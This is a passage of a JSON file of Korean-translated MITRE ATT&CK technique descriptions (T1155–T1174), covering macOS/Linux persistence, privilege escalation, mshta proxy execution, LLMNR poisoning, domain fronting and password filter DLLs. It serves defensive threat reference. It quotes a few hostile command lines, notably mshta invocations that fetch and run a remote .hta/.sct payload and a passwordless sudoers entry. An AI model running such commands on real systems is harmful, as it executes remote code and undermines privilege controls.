있습니다(인용: 매크로 맬웨어, 맥을 타겟으로 함). 스크립트는 <code>osascript /path/to/script</code> 또는 <code>osascript -e \"script here\"</code>와 같은 명령줄에서 실행할 수 있습니다.",
      "external_id": "T1155",
      "modified": "2020-04-14T13:26:00.846Z",
      "title": "AppleScript",
      "translated": true
    },
    {
      "description": "적대자는 사용자의 셸에 의해 트리거된 악성 명령을 실행하여 지속성을 확립할 수 있습니다. 사용자 셸은 이벤트에 따라 세션 전반에 걸쳐 여러 구성 스크립트를 실행합니다. 예를 들어, 사용자가 명령 줄 인터페이스를 열거나 원격으로 로그인(예: SSH)할 때 로그인 셸이 시작됩니다. 로그인 셸은 시스템(/etc) 및 사용자의 홈 디렉토리(~/)에서 스크립트를 실행하여 환경을 구성합니다. 시스템의 모든 로그인 셸은 시작 시 <code>/etc/profile</code>을 사용합니다. 이러한 구성 스크립트는 해당 디렉토리의 권한 수준에서 실행되며 환경 변수를 설정하고, 별칭을 생성하며, 사용자의 환경을 사용자화하는 데 자주 사용됩니다. 셸이 종료되거나 종료될 때, 셸의 적절한 종료를 보장하기 위해 추가 셸 스크립트가 실행됩니다.\n\n적대자는 셸에 의해 자동으로 실행되는 스크립트에 명령을 삽입하여 지속성을 확립하려고 시도할 수 있습니다. 대부분의 GNU/Linux 시스템의 기본 셸인 bash를 예로 들면, 적대자는 <code>/etc/profile</code> 및 <code>/etc/profile.d</code> 파일에 악성 바이너리를 실행하는 명령을 추가할 수 있습니다(참고: intezer-kaiji-malware). 이러한 파일은 루트 권한이 필요하며 시스템의 모든 셸이 시작될 때마다 실행됩니다. 사용자 수준의 권한을 부여받은 적대자는 <code>~/.bash_profile</code>, <code>~/.bash_login</code>, 또는 <code>~/.profile</code>에 악성 명령을 삽입할 수 있습니다(Rocke). 사용자가 명령 줄 인터페이스를 열거나 원격으로 연결할 때 이러한 파일이 소싱됩니다. 적대자들은 시스템이 나열된 순서에서 존재하는 첫 번째 파일만 실행하기 때문에 종종 ~/.bash_profile을 사용합니다. 적대자들은 추가적으로 원격으로 연결되거나 명령 줄 인터페이스에서 새 탭과 같은 추가 대화형 셸이 열릴 때 추가로 실행되는 <code>~/.bashrc</code> 파일(Tsunami, Rocke, Linux Rabbit, Magento)을 활용하기도 했습니다. 일부 맬웨어는 프로그램의 종료를 목표로 하여 실행을 트리거하며(Cannon), 적대자는 세션 종료 시 <code>~/.bash_logout</code> 파일을 사용하여 악성 명령을 실행할 수 있습니다(Pearl_shellbot).\n\nmacOS의 경우, 이 기술의 기능은 유사하지만 macOS 10.15 이상에 대한 기본 셸인 zsh를 활용합니다. Terminal.app이 열리면 애플리케이션은 zsh 로그인 셸과 zsh 대화형 셸을 시작합니다. 로그인 셸은 <code>/etc/profile</code>, <code>/etc/zshenv</code>, <code>/etc/zprofile</code>, 및 <code>/etc/zlogin</code>을 사용하여 시스템 환경을 구성합니다. 그런 다음 로그인 셸은 <code>~/.zprofile</code> 및 <code>~/.zlogin</code>을 사용하여 사용자 환경을 구성합니다. 대화형 셸은 <code>~/.zshrc</code>를 사용하여 사용자 환경을 구성합니다. 종료 시 <code>/etc/zlogout</code> 및 <code>~/.zlogout</code>이 실행됩니다. 레거시 프로그램의 경우, macOS는 시작 시 <code>/etc/bashrc</code>를 실행합니다.",
      "external_id": "T1156",
      "modified": "2023-10-15T20:24:13.473Z",
      "title": "Malicious Shell Modification",
      "translated": true
    },
    {
      "description": "macOS와 OS X는 프로그램에 로드할 필요가 있는 동적 라이브러리(dylib)를 검색 경로에 따라 찾는 공통 방법을 사용합니다. 공격자는 애매한 경로를 이용하여 dylib를 심어 권한 상승 또는 지속성을 확보할 수 있습니다.\n\n일반적인 방법은 애플리케이션이 사용하는 dylib를 확인한 다음, 동일한 이름의 악성 버전을 검색 경로의 상위에 심는 것입니다. 이는 일반적으로 dylib이 애플리케이션과 동일한 폴더에 위치하게 됩니다. (출처: Writing Bad Malware for OSX) (출처: Malware Persistence on OS X)\n\n프로그램이 현재 사용자보다 높은 권한 수준에서 실행되도록 구성된 경우, dylib가 애플리케이션에 로드될 때 dylib도 해당 상승된 수준에서 실행됩니다. 이는 공격자가 권한 상승 기술로 사용할 수 있습니다.",
      "external_id": "T1157",
      "modified": "2021-03-30T00:51:57.919Z",
      "title": "Dylib Hijacking",
      "translated": true
    },
    {
      "description": "일반 사용자들이 시스템의 특수 파일을 실수로 변경하는 것을 방지하기 위해 대부분의 운영체제에서는 ‘숨김’ 파일 개념을 도입하고 있습니다. 이러한 파일은 사용자가 GUI를 통해 파일 시스템을 탐색하거나 명령 줄에서 정상적인 명령을 사용할 때 나타나지 않습니다. 사용자는 숨김 파일을 표시하라는 요청을 명확히 해야 하며, 이는 일련의 그래픽 사용자 인터페이스(GUI) 프롬프트나 명령 줄 스위치를 통해 가능합니다(Windows의 경우 <code>dir /a</code>, Linux 및 macOS의 경우 <code>ls -a</code> 사용).\n\n공격자는 이를 악용하여 시스템의 어느 곳에나 파일과 폴더를 숨김으로써 지속성을 유지하거나 숨김 파일 조사를 포함하지 않는 일반 사용자나 시스템 분석을 피할 수 있습니다.\n\n### Windows\n\n사용자는 attrib.exe 바이너리를 사용하여 특정 파일을 숨김으로 표시할 수 있습니다. 파일이나 폴더를 숨김으로 표시하려면 <code>attrib +h filename</code>을 실행하면 됩니다. 비슷하게, “+s” 플래그는 파일을 시스템 파일로 표시하고 “+r” 플래그는 파일을 읽기 전용으로 마킹합니다. 대부분의 Windows 바이너리처럼, attrib.exe 바이너리는 이러한 변경 사항을 재귀적으로 적용할 수 있는 기능을 제공합니다(“/S”).\n\n### Linux/Mac\n\n사용자는 파일 또는 폴더 이름의 첫 번째 문자로 “.”를 추가하여 특정 파일을 간단히 숨김 파일로 만들 수 있습니다(출처: Sofacy Komplex Trojan, Antiquated Mac Malware). 점(.)으로 시작하는 파일과 폴더는 기본적으로 Finder 애플리케이션과 “ls”와 같은 표준 명령줄 유틸리티에서 보이지 않게 숨겨집니다. 사용자는 이러한 파일이 보이도록 설정을 구체적으로 변경해야 합니다. 명령줄 사용의 경우, 일반적으로 숨김 파일을 포함한 모든 파일을 볼 수 있는 플래그가 있습니다. Finder 애플리케이션에서 이 파일들을 보려면 다음 명령을 실행해야 합니다: <code>defaults write com.apple.finder AppleShowAllFiles YES</code>, 그 후 Finder 애플리케이션을 다시 시작해야 합니다.\n\n### Mac\n\nmacOS의 파일은 UF_HIDDEN 플래그로 마킹하여 Finder.app에서 보이지 않도록 할 수 있지만, Terminal.app에서는 여전히 볼 수 있습니다(출처: WireLurker). 많은 애플리케이션들이 사용자의 작업 공간을 혼잡하게 하지 않기 위해 정보를 저장하기 위해 이러한 숨김 파일과 폴더를 생성합니다. 예를 들어, SSH 유틸리티는 숨겨진 .ssh 폴더를 생성하여 사용자의 알려진 호스트와 키를 포함하고 있습니다.",
      "external_id": "T1158",
      "modified": "2020-03-13T21:01:22.966Z",
      "title": "Hidden Files and Directories",
      "translated": true
    },
    {
      "description": "애플의 개발자 문서에 따르면, 사용자가 로그인할 때마다 사용자의 각 launch-on-demand 사용자 에이전트에 대한 매개변수를 로드하는 사용자별 launchd 프로세스가 시작됩니다. 이 매개변수는 <code>/System/Library/LaunchAgents</code>, <code>/Library/LaunchAgents</code>, 및 <code>$HOME/Library/LaunchAgents</code>에서 찾을 수 있는 속성 리스트(plist) 파일에서 로드됩니다 (출처: AppleDocs Launch Agent Daemons) (출처: OSX Keydnap 악성 코드) (출처: 구식 Mac 악성 코드). 이러한 런치 에이전트는 실행될 실행 파일을 가리키는 속성 리스트 파일을 가지고 있습니다 (출처: OSX.Dok 악성 코드).\n\n공격자는 launchd 또는 launchctl을 사용하여 plist를 적절한 디렉터리에 로드하여 로그인 시 실행되도록 구성할 수 있는 새로운 런치 에이전트를 설치할 수 있습니다 (출처: Sofacy Komplex 트로이목마) (출처: Mac 악성 코드 지속성 방법). 에이전트 이름은 관련 운영 체제나 무해한 소프트웨어의 이름을 사용하여 위장할 수 있습니다. 런치 에이전트는 사용자 수준 권한으로 생성되며 사용자가 로그인할 때 사용자의 권한으로 실행됩니다 (출처: OSX 악성 코드 탐지) (출처: OS X용 OceanLotus). 특정 사용자가 로그인할 때 (특정 사용자의 디렉터리 구조 내에서) 또는 모든 사용자가 로그인할 때 (관리자 권한이 필요함) 실행되도록 설정할 수 있습니다.",
      "external_id": "T1159",
      "modified": "2020-01-17T16:52:35.818Z",
      "title": "Launch Agent",
      "translated": true
    },
    {
      "description": "Apple의 개발 문서에 따르면, macOS 및 OS X가 부팅될 때 launchd가 실행되어 시스템 초기화를 완료합니다. 이 과정에서 <code>/System/Library/LaunchDaemons</code> 및 <code>/Library/LaunchDaemons</code>에 있는 속성 리스트(plist) 파일에서 각 요청 기반 시스템 수준의 데몬에 대한 매개변수를 로드합니다 (인용: AppleDocs Launch Agent Daemons). 이러한 Launch Daemons는 실행될 실행 파일을 가리키는 속성 리스트 파일을 가지고 있습니다 (인용: Methods of Mac Malware Persistence).\n\n적대자는 launchd 또는 launchctl을 사용하여 plist를 적절한 디렉토리에 로드하여 시작 시 실행되도록 구성할 수 있는 새로운 런치 데몬을 설치할 수 있습니다 (인용: OSX Malware Detection). 데몬 이름은 관련 운영 체제 또는 안전한 소프트웨어의 이름을 사용하여 위장할 수 있습니다 (인용: WireLurker). Launch Daemons는 관리자 권한으로 생성될 수 있지만, 루트 권한으로 실행되므로 적대자는 서비스를 이용해 관리자 권한에서 루트 권한으로 상승할 수도 있습니다.\n\nplist 파일의 권한은 root:wheel이어야 하지만, 그것이 가리키는 스크립트나 프로그램에는 그러한 요구사항이 없습니다. 따라서 부적절한 구성으로 인해 적대자가 현재 Launch Daemon의 실행 파일을 수정하고 지속성 또는 권한 상승을 얻는 것이 가능할 수 있습니다.",
      "external_id": "T1160",
      "modified": "2020-03-19T15:08:50.043Z",
      "title": "Launch Daemon",
      "translated": true
    },
    {
      "description": "Mach-O 바이너리는 바이너리가 로드될 때 특정 작업을 수행하는 데 사용되는 여러 헤더를 가지고 있습니다. Mach-O 바이너리의 LC_LOAD_DYLIB 헤더는 macOS 및 OS X에게 실행 시간 동안 로드해야 할 동적 라이브러리(디엘립스)를 알려줍니다. 이들은 나머지 필드 및 종속성에 대한 조정이 이루어지는 한, 컴파일된 바이너리에 임의로 추가될 수 있습니다 (인용: OSX용 나쁜 맬웨어 작성하기). 이러한 변경을 수행하기 위한 도구가 마련되어 있습니다. 변경이 이루어질 경우 바이너리의 디지털 서명이 무효화됩니다. 공격자는 단순히 LC_CODE_SIGNATURE 명령어를 바이너리에서 제거하여 서명이 로드 시간에 확인되지 않도록 함으로써 이 문제를 해결할 수 있습니다 (인용: OS X에서의 맬웨어 지속성).",
      "external_id": "T1161",
      "modified": "2021-03-30T00:51:58.008Z",
      "title": "LC_LOAD_DYLIB Addition",
      "translated": true
    },
    {
      "description": "MacOS는 사용자가 로그인할 때 실행할 특정 애플리케이션을 나열하는 옵션을 제공합니다. 이 애플리케이션은 로그인한 사용자와 관련된 컨텍스트에서 실행되며, 사용자가 로그인할 때마다 시작됩니다. 서비스 관리 프레임워크를 사용하여 설치된 로그인 항목은 시스템 환경설정에서 보이지 않으며, 이를 제거할 수 있는 것은 해당 항목을 생성한 애플리케이션뿐입니다 (출처: 로그인 항목 추가). 사용자는 시스템 환경설정에서 볼 수 있는 공유 파일 목록을 사용하여 설치된 로그인 항목에 대해 직접 제어할 수 있습니다 (출처: 로그인 항목 추가). 이러한 로그인 항목은 사용자의 <code>~/Library/Preferences/</code> 디렉토리에 <code>com.apple.loginitems.plist</code>라는 plist 파일에 저장됩니다 (출처: Mac 맬웨어 지속성 방법). 이 애플리케이션 중 일부는 사용자에게 보이는 대화 상자를 열 수 있지만, 모든 애플리케이션이 그렇게 할 필요는 없으며 '숨기기' 옵션을 사용할 수 있습니다. 만약 적이 자신의 로그인 항목을 등록하거나 기존 항목을 수정할 수 있다면, 사용자가 로그인할 때마다 코드를 실행하는 지속성 메커니즘을 사용하여 이를 활용할 수 있습니다 (출처: OS X의 맬웨어 지속성) (출처: OSX.Dok 맬웨어). API 메서드 <code>SMLoginItemSetEnabled</code>를 사용하여 로그인 항목을 설정할 수 있으며, [AppleScript](https://attack.mitre.org/techniques/T1155)와 같은 스크립팅 언어도 이를 수행할 수 있습니다 (출처: 로그인 항목 추가).",
      "external_id": "T1162",
      "modified": "2022-04-22T18:50:50.483Z",
      "title": "Login Item",
      "translated": true
    },
    {
      "description": "부팅 과정 동안 macOS는 <code>source /etc/rc.common</code>를 실행합니다. 이 파일은 다양한 유틸리티 함수가 포함된 셸 스크립트입니다. 이 파일은 또한 명령줄 인수를 처리하고 시스템 설정을 수집하기 위한 루틴을 정의하고 있으므로, 스타트업 항목 스크립트의 시작 부분에 포함하는 것이 권장됩니다(참조: 스타트업 항목). macOS와 OS X에서 이 방법은 현재 launch agents와 launch daemons로 대체된 기법이지만, 여전히 사용되고 있습니다.\n\n위협 행위자는 rc.common 파일을 사용하여 루트 사용자로서 매부팅 시 실행될 수 있는 코드를 숨기는 방법으로 활용할 수 있습니다(참조: Mac 맬웨어 지속성 방법).",
      "external_id": "T1163",
      "modified": "2020-01-15T16:27:32.362Z",
      "title": "Rc.common",
      "translated": true
    },
    {
      "description": "Mac OS X 10.7 (Lion)부터 사용자는 재부팅할 때 특정 애플리케이션을 다시 열도록 지정할 수 있습니다. 이는 일반적으로 모든 앱에 대해 그래픽 사용자 인터페이스(GUI)를 통해 수행되지만, 이 정보를 포함하는 속성 목록 파일(plist)도 존재하며, 경로는 <code>~/Library/Preferences/com.apple.loginwindow.plist</code> 및 <code>~/Library/Preferences/ByHost/com.apple.loginwindow.*.plist</code>입니다.\n\n공격자는 이러한 파일 중 하나를 직접 수정하여 그들의 악성 실행 파일에 대한 링크를 포함시켜 사용자가 기기를 재부팅할 때마다 지속성을 제공하는 메커니즘을 설정할 수 있습니다(출처: Mac 악성코드 지속성 방법).",
      "external_id": "T1164",
      "modified": "2020-01-24T18:26:18.933Z",
      "title": "Re-opened Applications",
      "translated": true
    },
    {
      "description": "Apple의 문서에 따르면, 시작 항목(startup items)은 부팅 프로세스의 마지막 단계에서 실행되며, 실행 순서를 결정하는 데 사용되는 구성 정보와 함께 쉘 스크립트 또는 기타 실행 파일을 포함합니다 (출처: 시작 항목). 이는 기술적으로 더 이상 사용되지 않는 버전(Launch Daemons로 대체됨)이며, 따라서 적절한 폴더인 `<code>/Library/StartupItems</code>`가 시스템에 기본적으로 존재할 것이라고 보장할 수는 없지만, macOS Sierra에서는 기본적으로 존재하는 것으로 나타납니다. 시작 항목은 실행 파일과 구성 속성 목록(plist)인 `<code>StartupParameters.plist</code>`가 최상위 디렉토리에 위치하는 디렉토리입니다.\n\n공격자는 StartupItems 디렉토리에 적절한 폴더/파일을 생성하여 자신만의 지속성 메커니즘을 등록할 수 있습니다 (출처: Mac 맬웨어 지속성 방법). 게다가, StartupItems는 macOS의 부팅 단계에서 실행되므로 루트 권한으로 실행됩니다. 공격자가 기존의 시작 항목을 수정할 수 있다면, 권한 상승(Privilege Escalation)이 가능해질 것입니다.",
      "external_id": "T1165",
      "modified": "2020-01-15T18:02:49.891Z",
      "title": "Startup Items",
      "translated": true
    },
    {
      "description": "Linux 또는 macOS에서 애플리케이션에 setuid 또는 setgid 비트가 설정되면 이는 애플리케이션이 각각 소유자 사용자 또는 그룹의 권한으로 실행됨을 의미합니다 (인용: setuid 매뉴얼 페이지). 일반적으로 애플리케이션은 소유자 사용자 또는 그룹에 관계없이 현재 사용자의 컨텍스트에서 실행됩니다. 그러나 프로그램이 정상적으로 작동하기 위해서는 권한이 상승된 상태에서 실행되어야 하는 경우가 있으며, 이를 실행하는 사용자는 권한이 상승된 상태가 필요하지 않을 수도 있습니다. root에 의해 수행되어야 하는 sudoers 파일에 항목을 추가하는 대신, 어떤 사용자든 자신의 애플리케이션에 setuid 또는 setgid 플래그를 설정할 수 있습니다. 이러한 비트는 <code>ls -l</code>를 통해 파일의 속성을 확인할 때 \"x\" 대신 \"s\"로 표시됩니다. <code>chmod</code> 프로그램은 비트마스킹을 통해서 <code>chmod 4777 [파일]</code> 또는 약식 이름을 통해서 <code>chmod u+s [파일]</code>로 이러한 비트를 설정할 수 있습니다.\n\n상대방은 이를 통해 쉘 탈출을 하거나 setuid 또는 setgid 비트가 설정된 애플리케이션의 취약점을 악용하여 다른 사용자의 컨텍스트에서 코드를 실행할 수 있습니다. 또한, 상대방은 이 메커니즘을 자신의 악성 소프트웨어에 사용하여 미래에 권한이 상승된 컨텍스트에서 실행할 수 있도록 할 수 있습니다 (인용: OSX Keydnap 악성 코드).",
      "external_id": "T1166",
      "modified": "2020-02-05T20:09:22.650Z",
      "title": "Setuid and Setgid",
      "translated": true
    },
    {
      "description": "El Capitan 이전의 OS X에서는 루트 액세스 권한이 있는 사용자가 로그인한 사용자의 평문 키체인 비밀번호를 읽을 수 있습니다. 이는 Apple의 키체인 구현이 이러한 자격 증명을 캐시할 수 있도록 하여 사용자가 반복적으로 비밀번호를 입력하라는 메시지를 받지 않도록 하기 때문입니다. (출처: OS X Keychain) (출처: DA 외부, OS X 방식) Apple의 securityd 유틸리티는 사용자의 로그온 비밀번호를 받아 PBKDF2로 암호화하고 이 마스터 키를 메모리에 저장합니다. Apple은 또한 사용자의 비밀번호를 암호화하기 위해 일련의 키와 알고리즘을 사용하지만, 일단 마스터 키를 찾으면 공격자는 최종 비밀번호를 해독하기 위해 다른 값을 반복하는 것만으로도 됩니다. (출처: OS X Keychain)\n\n만약 공격자가 루트 액세스 권한을 얻을 수 있다면 (이로 인해 securityd의 메모리를 읽을 수 있게 됩니다), 공격자는 메모리를 스캔하여 상대적으로 적은 시도로 올바른 키 시퀀스를 찾아 사용자 로그온 키체인을 해독할 수 있습니다. 이는 공격자에게 사용자, WiFi, 메일, 브라우저, 인증서, 보안 노트 등의 모든 평문 비밀번호를 제공합니다. (출처: OS X Keychain) (출처: OSX Keydnap 악성코드)",
      "external_id": "T1167",
      "modified": "2020-02-12T18:56:59.153Z",
      "title": "Securityd Memory",
      "translated": true
    },
    {
      "description": "리눅스와 macOS 시스템에서는 사전 예약된 주기적 백그라운드 작업을 생성하기 위해 여러 가지 방법을 지원합니다: cron (인용: Die.net Linux crontab Man Page), at (인용: Die.net Linux at Man Page), 그리고 launchd (인용: AppleDocs Scheduling Timed Jobs). Windows 시스템의 [예약 작업/작업](https://attack.mitre.org/techniques/T1053)과 달리, 리눅스 기반 시스템의 작업 예약은 안전한 셸(SSH)과 같은 이미 설정된 원격 세션과 함께 사용하지 않는 한 원격으로 수행할 수 없습니다.\n\n### cron\n\n시스템 전체의 cron 작업은 <code>/etc/crontab</code> 파일이나 <code>/etc/cron.d/</code> 디렉토리 또는 Cron 데몬에서 지원하는 기타 위치를 수정하여 설치할 수 있으며, 사용자별 cron 작업은 특정 형식의 crontab 파일을 사용하여 crontab을 통해 설치됩니다 (인용: AppleDocs Scheduling Timed Jobs). 이 방법은 macOS 및 리눅스 시스템에서 작동합니다.\n\n이 방법들은 사용자 상호작용 없이 특정 주기로 백그라운드에서 명령어나 스크립트를 실행할 수 있도록 합니다. 공격자는 시스템 시작 시 또는 일정한 주기로 프로그램을 실행하기 위해 작업 예약을 사용할 수 있으며, 이를 통해 영속성(Persistence) (인용: Janicab) (인용: Methods of Mac Malware Persistence) (인용: Malware Persistence on OS X) (인용: Avast Linux Trojan Cron Persistence) 을 달성하고, 수평 이동(Lateral Movement)의 일환으로 실행을 수행하며, 루트 권한을 획득하거나 특정 계정의 컨텍스트에서 프로세스를 실행할 수 있습니다.\n\n### at\n\nat 프로그램은 POSIX 기반 시스템, 즉 macOS와 리눅스에서 프로그램이나 스크립트 작업을 나중의 날짜와/또는 시간에 실행하도록 예약하는 또 다른 방법으로 사용될 수 있으며, 이는 동일한 목적을 위해 사용될 수 있습니다.\n\n### launchd\n\n각 launchd 작업은 [Launch Daemon](https://attack.mitre.org/techniques/T1160) 또는 [Launch Agent](https://attack.mitre.org/techniques/T1159)와 유사한 서로 다른 구성 속성 목록(plist) 파일로 설명되며, 여기에 시간 값을 가진 사전(dictionary)인 <code>StartCalendarInterval</code>라는 추가 키가 포함됩니다 (인용: AppleDocs Scheduling Timed Jobs). 이는 macOS 및 OS X에서만 작동합니다.",
      "external_id": "T1168",
      "modified": "2021-03-30T00:51:58.374Z",
      "title": "Local Job Scheduling",
      "translated": true
    },
    {
      "description": "sudoers 파일인 <code>/etc/sudoers</code>는 어떤 사용자가 어떤 명령을 실행할 수 있는지와 어떤 터미널에서 실행할 수 있는지를 설명합니다. 이 파일은 또한 사용자가 다른 사용자나 그룹으로서 어떤 명령을 실행할 수 있는지를 정의합니다. 이는 최소 권한의 원칙을 제공하여 사용자가 가능한 한 낮은 권한으로 대부분의 시간을 운영하고, 필요할 때 비밀번호를 입력하여 다른 사용자나 권한으로 상승하는 구조입니다. 그러나 sudoers 파일은 또한 <code>user1 ALL=(ALL) NOPASSWD: ALL</code>와 같은 행을 사용하여 사용자에게 비밀번호 입력을 요구하지 않도록 설정할 수 있습니다 (출처: OSX.Dok 악성코드).\n\n적대 세력은 이러한 설정을 악용하여 다른 사용자로 명령을 실행하거나 더 높은 권한으로 프로세스를 생성할 수 있습니다. 그러나 이 파일을 편집하려면 상승된 권한이 필요합니다.",
      "external_id": "T1169",
      "modified": "2020-02-05T20:11:12.593Z",
      "title": "Sudo",
      "translated": true
    },
    {
      "description": "mshta.exe는 Microsoft HTML 애플리케이션(HTA)을 실행하는 유틸리티입니다. HTA 파일의 파일 확장자는 <code>.hta</code>입니다. (출처: 위키백과 HTML 애플리케이션) HTA는 독립 실행형 애플리케이션으로, 브라우저 외부에서 Internet Explorer의 동일한 모델과 기술을 사용하여 실행됩니다. (출처: MSDN HTML 애플리케이션)\n\n적대적인 행위자는 mshta.exe를 사용하여 신뢰할 수 있는 Windows 유틸리티를 통해 악성 .hta 파일과 JavaScript 또는 VBScript의 실행을 프록시할 수 있습니다. 초기 손상 및 코드 실행을 위해 mshta.exe를 활용하는 다양한 유형의 위협 사례가 여러 가지 있습니다. (출처: Cylance Dust Storm) (출처: Red Canary HTA Abuse Part Deux) (출처: FireEye Attacks Leveraging HTA) (출처: Airbus Security Kovter Analysis) (출처: FireEye FIN7 April 2017)\n\n파일은 인라인 스크립트를 통해 mshta.exe에 의해 실행될 수 있습니다: <code>mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))</code>\n\n또한 URL에서 직접 실행될 수도 있습니다: <code>mshta http[:]//webserver/payload[.]hta</code>\n\nmshta.exe는 그 사용 가능성을 고려하지 않는 응용 프로그램 화이트리스트 솔루션을 우회하는 데 사용될 수 있습니다. mshta.exe는 Internet Explorer의 보안 컨텍스트 외부에서 실행되므로 브라우저 보안 설정도 우회합니다. (출처: LOLBAS Mshta)",
      "external_id": "T1170",
      "modified": "2022-01-19T21:19:03.910Z",
      "title": "Mshta",
      "translated": true
    },
    {
      "description": "링크-로컬 다중 전송 이름 해상도(LLMNR) 및 NetBIOS 이름 서비스(NBT-NS)는 호스트 식별의 대체 방법으로 사용되는 Microsoft Windows 구성 요소입니다. LLMNR은 도메인 이름 시스템(DNS) 형식을 기반으로 하며 동일한 로컬 링크에 있는 호스트들이 다른 호스트에 대한 이름 해상을 수행할 수 있도록 합니다. NBT-NS는 로컬 네트워크에서 시스템을 그들의 NetBIOS 이름으로 식별합니다. (출처: 위키백과 LLMNR) (출처: TechNet NetBIOS)\n\n공격자는 피해 네트워크에서 LLMNR(UDP 5355)/NBT-NS(UDP 137) 트래픽에 응답하여 이름 해상의 권위 있는 소스를 스푸핑할 수 있습니다. 이를 통해 요청된 호스트의 정체에 대해 아는 것처럼 행동하며, 서비스에 대한 독성을 주입하여 피해자가 공격자가 제어하는 시스템과 통신하게 만듭니다. 요청된 호스트가 식별/인증이 필요한 리소스에 속하는 경우, 사용자 이름과 NTLMv2 해시가 공격자가 제어하는 시스템으로 전송됩니다. 이후 공격자는 포트에서 트래픽을 모니터링하는 도구를 통해 또는 [네트워크 스니핑](https://attack.mitre.org/techniques/T1040)을 통해 전송된 해시 정보를 수집하고, [브루트 포스](https://attack.mitre.org/techniques/T1110)를 통해 오프라인에서 해시를 크랙하여 평문 비밀번호를 얻을 수 있습니다. 경우에 따라 공격자가 시스템 간의 인증 경로에 있는 시스템에 접근할 수 있거나, 자격 증명을 사용하는 자동화된 스캔이 공격자가 제어하는 시스템에 인증을 시도할 때, NTLMv2 해시가 가로채져서 전송되어 타겟 시스템에 대한 코드 접근 및 실행이 가능해질 수 있습니다. 중계 단계는 독성 주입과 함께 발생할 수 있지만, 독성 주입과는 독립적으로 발생할 수도 있습니다. (출처: byt3bl33d3r NTLM 리레이)(출처: Secure Ideas SMB 리레이)\n\n로컬 네트워크 내에서 이름 서비스를 독성 주입하는 데 사용할 수 있는 여러 도구들이 존재합니다. 예를 들어, NBNSpoof, Metasploit 및 [Responder](https://attack.mitre.org/software/S0174) 등이 있습니다. (출처: GitHub NBNSpoof) (출처: Rapid7 LLMNR 스푸퍼) (출처: GitHub Responder)",
      "external_id": "T1171",
      "modified": "2020-02-11T19:09:48.452Z",
      "title": "LLMNR/NBT-NS Poisoning and Relay",
      "translated": true
    },
    {
      "description": "도메인 프론팅은 콘텐츠 전송 네트워크(CDN) 및 여러 도메인을 호스팅하는 기타 서비스의 라우팅 방식을 이용하여 HTTPS 트래픽 또는 HTTPS를 통해 터널링된 트래픽의 의도된 목적지를 숨기는 방식입니다. (인용: Fifield, Blocking Resistant Communication through domain fronting, 2015) 이 기술은 TLS 헤더의 SNI 필드와 HTTP 헤더의 Host 필드에 다른 도메인 이름을 사용하는 것을 포함합니다. 두 도메인이 동일한 CDN에서 제공된다면, CDN은 TLS 헤더를 해제한 후 HTTP 헤더에 지정된 주소로 라우팅할 수 있습니다. 이 기술의 변형인 \"도메인 없는\" 프론팅은 SNI 필드가 비어 있는 상태를 이용합니다. 이 경우 SNI와 HTTP Host 필드가 일치하는지 검증하려 할 때, 비어 있는 SNI 필드를 무시함으로써 프론팅이 작동할 수 있게 합니다.\n\n예를 들어, domain-x와 domain-y가 동일한 CDN의 고객이라면, TLS 헤더에 domain-x를, HTTP 헤더에 domain-y를 배치할 수 있습니다. 이 경우 트래픽은 domain-x로 향하는 것처럼 보이지만, 실제로 CDN은 이를 domain-y로 라우팅할 수 있습니다.",
      "external_id": "T1172",
      "modified": "2020-03-14T23:29:54.083Z",
      "title": "Domain Fronting",
      "translated": true
    },
    {
      "description": "Windows 동적 데이터 교환(DDE)은 애플리케이션 간의 일회성 및/또는 지속적인 프로세스 간 통신(IPC)을 위한 클라이언트-서버 프로토콜입니다. 링크가 설정되면 애플리케이션은 문자열, 습식 데이터 링크(데이터 항목이 변경될 때 알림), 핫 데이터 링크(데이터 항목의 변경 복사본) 및 명령 실행 요청으로 구성된 거래를 자율적으로 교환할 수 있습니다.\n\n객체 연결 및 삽입(OLE), 즉 문서 간 데이터 연결 기능은 원래 DDE를 통해 구현되었습니다. COM에 의해 대체되었음에도 불구하고, DDE는 Windows 10과 대부분의 Microsoft Office 2016에서 레지스트리 키를 통해 활성화될 수 있습니다. (인용: BleepingComputer DDE는 Word에서 비활성화됨, 2017년 12월) (인용: Microsoft ADV170021, 2017년 12월) (인용: Microsoft DDE 권고, 2017년 11월)\n\n공격자는 DDE를 사용하여 임의의 명령을 실행할 수 있습니다. Microsoft Office 문서에는 DDE 명령이 포함되어 있을 수 있으며 (인용: SensePost PS DDE, 2016년 5월) (인용: Kettle CSV DDE, 2014년 8월), 이를 통해 직접 또는 내장된 파일을 통해 실행을 전달할 수 있습니다 (인용: Enigma DDE 되살리기, 2018년 1월), 피싱 캠페인이나 호스팅된 웹 콘텐츠를 통해 전달될 수 있으며, Visual Basic for Applications(VBA) 매크로 사용을 회피할 수 있습니다. (인용: SensePost 매크로 없는 DDE, 2017년 10월) DDE는 또한 명령 줄 실행에 대한 직접적인 접근 권한이 없는 손상된 시스템에서 작동 중인 공격자가 활용할 수 있습니다.",
      "external_id": "T1173",
      "modified": "2022-02-09T20:22:43.284Z",
      "title": "Dynamic Data Exchange",
      "translated": true
    },
    {
      "description": "윈도우 비밀번호 필터는 도메인 및 로컬 계정에 대한 비밀번호 정책 집행 메커니즘입니다. 필터는 비밀번호 정책에 대한 잠재적 비밀번호를 검증하는 메서드를 포함하는 동적 링크 라이브러리(DLL)로 구현됩니다. 필터 DLL은 로컬 계정의 경우 로컬 컴퓨터에, 도메인 계정의 경우 도메인 컨트롤러에 배치할 수 있습니다.\n\n새로운 비밀번호를 보안 계정 관리자(SAM)에 등록하기 전에 로컬 보안 권한(LHA)은 등록된 각 필터에 검증 요청을 합니다. 모든 등록된 필터가 검증을 확인하기 전까지는 잠재적 변화가 적용될 수 없습니다.\n\n적대자는 악성 비밀번호 필터를 등록하여 로컬 컴퓨터 및/또는 전체 도메인에서 자격 증명을 수집할 수 있습니다. 제대로 된 검증을 수행하기 위해 필터는 LHA로부터 평문 자격 증명을 받아야 합니다. 악성 비밀번호 필터는 비밀번호 요청이 있을 때마다 이러한 평문 자격 증명을 받게 됩니다. (인용: Carnal Ownage Password Filters, 2013년 9월)",
      "external_id": "T1174",
      "modified": "2020-02-11T19:06:18.818Z",
      "title": "Password Filter DLL",
      "translated": true
    },
    {
